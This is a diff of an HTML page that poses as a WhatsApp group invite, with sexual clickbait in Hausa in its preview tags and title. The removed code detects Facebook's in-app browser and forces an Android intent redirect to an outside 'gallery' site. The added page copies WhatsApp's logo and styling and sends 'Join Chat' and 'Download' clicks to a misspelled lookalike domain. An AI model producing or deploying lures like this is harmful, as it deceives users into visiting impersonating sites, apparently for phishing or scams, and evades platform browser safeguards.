@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp chating</title>
+    <title>Your Group Invite</title>
     <!-- Open Graph Meta Tags for Rich Preview -->
     <meta property="og:title" content="HARKA DADI🍆🍆💦">
     <meta property="og:description" content="Rukuni mai daɗi🥒🥒">
@@ -17,59 +17,107 @@
     <!-- End Open Graph Tags -->
     <style>
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-            background-color: #f0f0f0;
-            display: none; /* Hide body to prevent flash */
-        }
-        a {
-            color: #ff0000;
-            text-decoration: underline;
-            font-size: 1.2rem;
-        }
-        #manualLink {
-            display: none;
-            margin-top: 20px;
-        }
-        #debug {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
             color: #333;
-            font-size: 0.9rem;
-            margin-top: 10px;
+        }
+        header {
+            padding: 20px;
+            width: 100%;
+            text-align: center;
+            border-bottom: 1px solid #eee;
+        }
+        .logo {
+            height: 40px;
+        }
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+            text-align: center;
+            max-width: 500px;
+        }
+        .group-image {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-bottom: 30px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .group-name {
+            font-size: 24px;
+            font-weight: 500;
+            margin: 0 0 8px 0;
+        }
+        .group-desc {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 40px;
+        }
+        .join-btn {
+            background-color: #00a884; /* WhatsApp green */
+            color: white;
+            border: none;
+            padding: 14px 40px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 2px 10px rgba(0,168,132,0.3);
+        }
+        .join-btn:hover {
+            background-color: #008f6f;
+        }
+        .download-section {
+            margin-top: 60px;
+            text-align: center;
+            color: #666;
+        }
+        .download-link {
+            color: #00a884;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        footer {
+            padding: 20px;
+            width: 100%;
+            text-align: center;
+            background-color: #f8f9fa;
         }
     </style>
 </head>
 <body>
-    <h1>Redirecting to the website...</h1>
-    <p>If redirection fails, use the link below:</p>
-    <a id="manualLink" href="https://only-fan.github.io/Linda-galary/">Open in Browser</a>
-    <p id="debug"></p>
-
-    <script>
-        // Your target website URL
-        const targetUrl = "https://only-fan.github.io/Linda-galary/";
-
-        // Debug: Confirm page load
-        console.log("Page loaded at " + new Date().toLocaleString());
-        document.getElementById("debug").innerText = "Redirecting...";
-
-        // Detect if in Facebook in-app browser
-        if (/FBAN|FBAV/i.test(navigator.userAgent)) {
-            document.getElementById("debug").innerText += " (Facebook detected)";
-            // Instant redirect to standalone browser using intent
-            const intentUrl = `intent://${targetUrl.replace('https://', '')}#Intent;scheme=https;action=android.intent.action.VIEW;S.browser_fallback_url=${encodeURIComponent(targetUrl)};end`;
-            window.location.href = intentUrl;
-
-            // Immediate fallback if intent is blocked (no delay)
-            if (window.location.href.includes("intent")) {
-                document.getElementById("manualLink").style.display = "block";
-                document.getElementById("debug").innerText += " | Intent blocked, use manual link.";
-                document.body.style.display = "block"; // Show body for fallback
-            }
-        } else {
-            document.getElementById("debug").innerText += " (Not Facebook, redirecting directly)";
-            window.location.href = targetUrl;
-        }
-    </script>
+    <header>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo" class="logo">
+    </header>
+    
+    <main>
+        <img src="Whatsapp.jpg" alt="Group Image" class="group-image">
+        
+        <h1 class="group-name">matan arewa nono 💦🍆🍌</h1>
+        <p class="group-desc">WhatsApp Group Invite • Friendly community for harka dadi🍆🍆</p>
+        
+        <button class="join-btn" onclick="window.location.href='https://chat-on-whastapp.github.io/aedd43FGhjrTyhoC/'">
+            Join Chat
+        </button>
+        
+        <div class="download-section">
+            <p>Don't have WhatsApp yet?</p>
+            <a href="https://chat-on-whastapp.github.io/aedd43FGhjrTyhoC/" class="download-link">Download</a>
+        </div>
+    </main>
+    
+    <footer>
+        <!-- Optional: Add social icons or links here -->
+    </footer>
 </body>
-</html>
+    </html>
